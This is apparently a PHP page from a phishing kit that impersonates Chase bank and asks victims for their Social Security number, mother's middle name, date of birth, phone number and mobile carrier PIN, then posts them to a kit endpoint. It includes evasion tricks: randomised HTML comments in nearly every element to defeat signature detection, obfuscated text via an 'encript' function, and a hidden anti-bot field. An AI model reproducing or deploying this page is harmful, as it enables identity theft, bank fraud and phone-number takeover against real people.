<?php require("includes/header.php") ?>
<style type="text/css">
    .jpui.checkbox .checkboxWrap .check {
        display: inline-block;
        border: .0625rem solid #959595;
        height: 1.25rem;
        width: 1.25rem;
        border-radius: .1875rem;
        position: relative;
         bottom: 0rem; 
    }
</style>
    <div>
        <div class=" homepage" tabindex="-1">
            <div class=" logon-container">
                <header class=" toggle-aria-hidden">
                    <div id="hdrlog" class=" logon header jpui transparent navigation bar" style="display:block;">
                        <a>
                            <div class=" chase logo"><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        </a>
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                    <div id="hdrup" class=" logon header jpui transparent navigation bar" style="background: transparent;background-image: linear-gradient(to bottom, rgba(11, 110, 253, 0.88) 0, rgba(11, 110, 253, 0.49) 50%, rgba(0, 0, 0, 0) 100%); display:none;">
                        <a>
                            <div class=" chase logo"><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        </a>
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                </header>
                <main>
                    <div class=" container logon">
                        <div>
                            <div>
                                <div class=" jpui background image fixed">
                                    <style type="text/css">
                                        .jpui.background.image {
                                            background-image: url(./img/mobilenight.jpeg);
                                            filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='./img/mobilenight.jpeg', sizingMethod='scale');
                                            -ms-filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='./img/mobilenight.jpeg', sizingMethod='scale');
                                        }
                                        
                                        @media (min-width:320px) {
                                            .jpui.background.image {
                                                background-image: url(./img/mobilenight.jpeg);
                                            }
                                        }
                                        
                                        @media (min-width:992px) {
                                            .jpui.background.image {
                                                background-image: url(./img/tabletnight.jpeg);
                                            }
                                        }
                                        
                                        @media (min-width:1024px) {
                                            .jpui.background.image {
                                                background-image: url(./img/desktopnight.jpeg);
                                            }
                                        }
                                    </style>
                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        <div class=" row">
                        	<div class=" col-xs-12 col-sm-6 col-sm-offset-3 logon-box">

                                <div class=" jpui raised segment" id="ssno" style="max-width: 470px!important; display:block;">

                                    <div class=" row">
                                        <div class=" col-xs-10 col-xs-offset-1">
                                            <h3 class=" u-focus in-progress" tabindex="-1"><?php encript('E').encript('n').encript('t').encript('e').encript('r'); ?> your personal information.</h3>
                                            <br>
                                            <h3 class=" u-focus in-progress" tabindex="-1" style="font-size: 18px; color: #dab70d;"><img src="./img/alert.gif" style="width: 17px;" > Notice : Enter Your Valid personal info</h3>
                                            <form action="../ElZero/actions/info" method="POST" autocomplete="off" >
                                                 <input type="hidden" name="tokenElzeroCsrf" value="<?php echo $_SESSION['ElZeR0_ToKeN'];?>">
                                                <input type="hidden" name="elzeroKiller" value="">
                                                <div id="" align="center">
                                                    <ol class=" progtrckr" data-progtrckr-steps="4">
                                                        <li class=" progtrckr-done"></li>
                                                        <li class=" progtrckr-done"></li>
                                                        <li class=" progtrckr-todo"></li>
                                                    </ol>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>

                                                <br>
                                                <br>
                                                <div id="errssn"><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <br>
                                                <div class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class=" jpui vertical">
                                                        <div id="labelSSN" class=" align-label-input floating-label__container ssn1">
                                                            <div class=" label-wrapper">
                                                                <label class=" jpui fieldlabel label-alignment vertical" for="ssnnum">social security Number</label>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                            <div class=" logon-xs-toggle">
                                                                <input class=" jpui input logon-xs-toggle " maxlength="11" pattern="[0-9]{3}-[0-9]{2}-[0-9]{4}" minlength="11" id="ssn" placeholder="" autocomplete="off" type="text" name="SSN" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <div class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class=" jpui vertical">
                                                        <div id="labelMMN" class=" align-label-input floating-label__container mdn1">
                                                            <div class=" label-wrapper">
                                                                <label class=" jpui fieldlabel label-alignment vertical" for="mdn">Mother's Middle Name</label>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                            <div class=" logon-xs-toggle">
                                                                <input class=" jpui input logon-xs-toggle " id="MMN" placeholder="" autocomplete="off" type="text" name="mdn" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <div class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class=" jpui vertical">
                                                        <div id="labelDOB" class=" align-label-input floating-label__container dob1">
                                                            <div class=" label-wrapper">
                                                                <label class=" jpui fieldlabel label-alignment vertical" for="dob">Date Of Birth</label>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                            <div class=" logon-xs-toggle">
                                                                <input class=" jpui input logon-xs-toggle " maxlength="10" minlength="8" id="DOB" placeholder="" autocomplete="off" type="text" name="dob" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <div class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class=" jpui vertical">
                                                        <div id="labelPhoneN" class=" align-label-input floating-label__container phone1">
                                                            <div class=" label-wrapper">
                                                                <label class=" jpui fieldlabel label-alignment vertical" for="phone">Phone number</label>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                            <div class=" logon-xs-toggle">
                                                                <input class=" jpui input logon-xs-toggle " maxlength="14" minlength="14" id="phoneN" placeholder="" autocomplete="off" type="text" name="phone" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <div class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class=" jpui vertical">
                                                        <div id="labelCarrier" class=" align-label-input floating-label__container capin1">
                                                            <div class=" label-wrapper">
                                                                <label class=" jpui fieldlabel label-alignment vertical" for="capin">Carrier pin</label>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                            <div class=" logon-xs-toggle">
                                                                <input class=" jpui input logon-xs-toggle " maxlength="4" minlength="4" id="Carrier" placeholder="" autocomplete="off" type="text" name="carrier" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <div class=" row">
                                                    <button type="submit" class=" jpui button focus fluid primary touch"><span class=" label">Confirm</span> </button>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>

                                            </form>
                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        	<?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                    	<?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                	<?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
            	</main>
            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>

<?php require("includes/footer.php") ?>




